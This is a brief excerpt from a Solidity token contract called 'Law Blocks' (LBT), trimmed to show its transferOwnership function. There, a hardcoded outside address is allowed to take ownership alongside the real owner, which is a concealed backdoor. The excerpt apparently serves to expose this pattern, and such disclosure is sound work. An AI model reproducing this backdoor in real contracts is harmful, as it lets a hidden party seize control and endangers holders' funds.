...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x7694fDfB16eB3485EEEF62dc9f9cD7Cfc2B0C3D5));
...
contract LBT is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "LBT";
  string private _name = "Law Blocks";
